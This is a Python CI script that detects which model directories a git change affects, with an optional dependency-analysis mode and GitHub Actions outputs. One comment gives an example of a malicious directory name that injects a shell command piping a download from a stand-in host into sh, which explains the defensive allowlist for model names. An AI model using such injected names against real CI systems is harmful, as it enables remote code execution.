"""Enhanced model detection with optional dependency analysis.

This script provides two modes:
1. Default mode: Current behavior - commons changes trigger all models (safe, proven)
2. Smart mode (--smart): Uses dependency analysis to only test affected models

The smart mode is opt-in and falls back to default mode if analysis fails.
"""

import re
import sys
import time
from typing import Any

from ci_utils import (
    EXCLUDED_MODEL_DIRS,
    get_changed_files,
    is_docs_only,
    json_dumps,
    list_subdirectories,
    write_github_outputs,
)

# Detected model names become CI matrix legs that get interpolated into shell
# commands. Only plain slugs are allowed through; a malicious PR could otherwise
# add a directory whose NAME injects shell (e.g. `models/x;curl evil|sh/...`).
# Defense-in-depth — the workflow also passes matrix values via quoted env vars.
_SAFE_MODEL_NAME = re.compile(r"^[A-Za-z0-9_-]+$")


def _safe_model_names(names: list[str]) -> list[str]:
    """Drop any name that isn't a plain model slug ([A-Za-z0-9_-])."""
    safe = []
    for name in names:
        if _SAFE_MODEL_NAME.match(name):
            safe.append(name)
        else:
            print(f"⚠️  Skipping model with unsafe directory name: {name!r}")
    return safe


def get_all_valid_models() -> set[str]:
    """Get all valid model directories (excluding commons and scripts)."""
    return list_subdirectories("models", EXCLUDED_MODEL_DIRS)


def detect_affected_models_default(
    changed_files: list[str], for_deployment_tests: bool = False
) -> tuple[set[str], bool]:
    """Original detection logic - commons changes trigger all models.

    This is the current production behavior that's battle-tested.
    """
    affected_models = set()
    commons_changed = False

    for file_path in changed_files:
        if not file_path.startswith("models/"):
            continue

        if file_path.startswith("models/commons/"):
            # A docs/data-only commons change (README.md, *.yaml, ...) does not
            # affect any model's runtime — skip it, matching smart mode's
            # `_categorize_changed_files`. Without this, a commons docs change
            # would needlessly trigger ALL models (Modal cost).
            if is_docs_only(file_path):
                continue
            commons_changed = True
            if not for_deployment_tests:
                print(f"ℹ️  Commons file changed: {file_path}")
                return get_all_valid_models(), True
            continue

        if file_path.startswith("models/scripts/"):
            continue

        if is_docs_only(file_path):
            continue

        parts = file_path.split("/")
        if len(parts) >= 2:
            model_name = parts[1]
            if model_name not in EXCLUDED_MODEL_DIRS:
                affected_models.add(model_name)

    return affected_models, commons_changed


def _categorize_changed_files(changed_files: list[str]) -> tuple[list[str], set[str]]:
    """Categorize changed files into commons and model changes."""
    commons_changes = []
    direct_model_changes = set()

    for file_path in changed_files:
        if not file_path.startswith("models/"):
            continue

        if file_path.startswith("models/commons/"):
            if not is_docs_only(file_path):
                commons_changes.append(file_path)
        elif not file_path.startswith("models/scripts/"):
            if is_docs_only(file_path):
                continue
            parts = file_path.split("/")
            if len(parts) >= 2:
                model_name = parts[1]
                if model_name not in EXCLUDED_MODEL_DIRS:
                    direct_model_changes.add(model_name)

    return commons_changes, direct_model_changes


def _run_dependency_analysis(commons_changes: list[str]) -> set[str]:
    """Run dependency analysis to find affected models."""
    from analyze_commons_dependencies import DependencyAnalyzer

    analyzer = DependencyAnalyzer()
    analyzer.build_import_map()
    commons_affected_models, _ = analyzer.get_affected_models(commons_changes)
    return commons_affected_models


def detect_affected_models_smart(
    changed_files: list[str], for_deployment_tests: bool = False
) -> tuple[set[str], bool, dict[str, Any]]:
    """Smart detection using dependency analysis.

    Only tests models that actually import from changed commons modules.
    Falls back to default behavior if analysis fails.
    """
    metrics: dict[str, Any] = {
        "method": "smart",
        "commons_files_changed": [],
        "models_saved": 0,
        "time_saved_estimate_minutes": 0,
        "analysis_time_ms": 0,
        "fallback": False,
    }

    commons_changes, direct_model_changes = _categorize_changed_files(changed_files)
    commons_changed = bool(commons_changes)
    affected_models = set(direct_model_changes)
    metrics["commons_files_changed"] = commons_changes

    if commons_changed and not for_deployment_tests:
        start_time = time.time()

        try:
            print("🧠 Using smart dependency analysis...")

            commons_affected_models = _run_dependency_analysis(commons_changes)
            affected_models.update(commons_affected_models)

            all_models = get_all_valid_models()
            models_saved = len(all_models) - len(affected_models)
            metrics["models_saved"] = models_saved
            metrics["time_saved_estimate_minutes"] = models_saved * 3

            print(f"  📊 {len(affected_models)} models affected by commons changes")
            print(
                f"  💰 Saving {models_saved} model deployments "
                f"(~{metrics['time_saved_estimate_minutes']} minutes)"
            )

        except ImportError:
            print("⚠️ Dependency analyzer not found, falling back to default mode")
            affected_models = get_all_valid_models()
            metrics["fallback"] = True
            metrics["method"] = "default (fallback)"
        except Exception as e:
            print(f"⚠️ Dependency analysis failed: {e}, falling back to default mode")
            affected_models = get_all_valid_models()
            metrics["fallback"] = True
            metrics["method"] = "default (fallback)"
            metrics["error"] = str(e)

        metrics["analysis_time_ms"] = int((time.time() - start_time) * 1000)

    return affected_models, commons_changed, metrics


def _build_model_outputs(
    models_list: list[str],
    models_with_code_changes: list[str],
    commons_changed: bool = False,
    changed_files: list[str] | None = None,
    metrics: dict[str, Any] | None = None,
) -> dict[str, str]:
    """Build the outputs dict for GitHub Actions."""
    has_unit_test_changes = bool(
        changed_files and any("test" in f for f in changed_files)
    )

    outputs = {
        "models_changed": json_dumps(models_list),
        "models_with_code_changes": json_dumps(models_with_code_changes),
        "has_models": "true" if models_list else "false",
        "has_models_with_code_changes": (
            "true" if models_with_code_changes else "false"
        ),
        "count": str(len(models_list)),
        "commons_changed": "true" if commons_changed else "false",
        "has_unit_test_changes": "true" if has_unit_test_changes else "false",
    }

    if metrics:
        outputs["detection_method"] = metrics.get("method", "default")
        outputs["models_saved"] = str(metrics.get("models_saved", 0))
        outputs["time_saved_minutes"] = str(
            metrics.get("time_saved_estimate_minutes", 0)
        )

    return outputs


def main() -> None:
    """Main entry point with smart mode support."""
    import argparse

    parser = argparse.ArgumentParser(
        description="Detect affected models from git changes",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default mode (production):
  %(prog)s origin/main

  # Smart mode with dependency analysis:
  %(prog)s origin/main --smart

  # For deployment tests:
  %(prog)s origin/main --deployment-tests
""",
    )

    parser.add_argument(
        "base_ref",
        nargs="?",
        default="HEAD^",
        help="Git reference to compare against (default: HEAD^)",
    )
    parser.add_argument(
        "--deployment-tests",
        action="store_true",
        help="Detect for deployment tests (ignores commons for triggering)",
    )
    parser.add_argument(
        "--smart",
        action="store_true",
        help="Enable smart dependency analysis (experimental)",
    )
    parser.add_argument(
        "--force-default",
        action="store_true",
        help="Force default mode even if smart is requested",
    )

    args = parser.parse_args()

    changed_files = get_changed_files(args.base_ref)

    if not changed_files:
        print("📭 No changes detected")
        write_github_outputs(_build_model_outputs([], [], False, [], None))
        sys.exit(0)

    print(f"📝 Found {len(changed_files)} changed file(s)")

    use_smart = args.smart and not args.force_default
    metrics: dict[str, Any]

    if use_smart:
        print("🔍 Smart mode enabled")
        affected_models, commons_changed, metrics = detect_affected_models_smart(
            changed_files, for_deployment_tests=args.deployment_tests
        )
    else:
        print("📦 Using default detection (commons → all models)")
        affected_models, commons_changed = detect_affected_models_default(
            changed_files, for_deployment_tests=args.deployment_tests
        )
        metrics = {"method": "default"}

    if commons_changed and not args.deployment_tests:
        if use_smart and not metrics.get("fallback"):
            print(f"🎯 Smart: {len(affected_models)} models need testing")
        else:
            print("🔄 Commons changed - deploying all valid models")

    models_list = _safe_model_names(sorted(affected_models))

    models_with_code_changes: list[str] = []
    if not args.deployment_tests:
        direct_changes, _ = detect_affected_models_default(
            changed_files, for_deployment_tests=True
        )
        models_with_code_changes = _safe_model_names(sorted(direct_changes))

    write_github_outputs(
        _build_model_outputs(
            models_list,
            models_with_code_changes,
            commons_changed,
            changed_files,
            metrics,
        )
    )

    if models_list:
        print(f"\n📋 {len(models_list)} model(s) affected:")
        for model in models_list:
            print(f"  • {model}")

        if use_smart and metrics and metrics.get("models_saved", 0) > 0:
            print(
                f"\n💡 Smart mode saved {metrics['models_saved']} "
                "unnecessary deployments"
            )
            print(
                f"⏱️  Estimated time saved: "
                f"{metrics['time_saved_estimate_minutes']} minutes"
            )
    else:
        print("✨ No model changes to deploy")

    sys.exit(0)


if __name__ == "__main__":
    main()
